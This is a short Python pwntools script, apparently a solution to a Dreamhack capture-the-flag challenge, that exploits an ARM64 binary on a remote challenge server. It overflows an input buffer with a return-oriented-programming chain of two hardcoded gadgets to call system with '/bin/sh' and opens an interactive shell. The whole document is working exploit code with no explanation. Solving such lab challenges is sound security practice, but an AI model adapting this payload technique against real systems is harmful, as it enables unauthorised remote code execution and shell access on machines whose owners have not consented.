from pwn import *

context.arch='arm64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16771
r = remote(HOST, PORT)

system = 0x401b00
binsh = 0x4671C8

'''
0x0000000000413154 : ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x80 ; ret
0x0000000000442e78 : mov x0, x19 ; mov w2, w21 ; mov w1, #0 ; blr x20
'''

g1 = 0x413154
g2 = 0x442e78

payload = flat([
    b'A'*0x10,
    0,
    g1,
    0,
    g2,
    binsh,
    system
])
r.sendlineafter(b'input: ', payload)

r.interactive()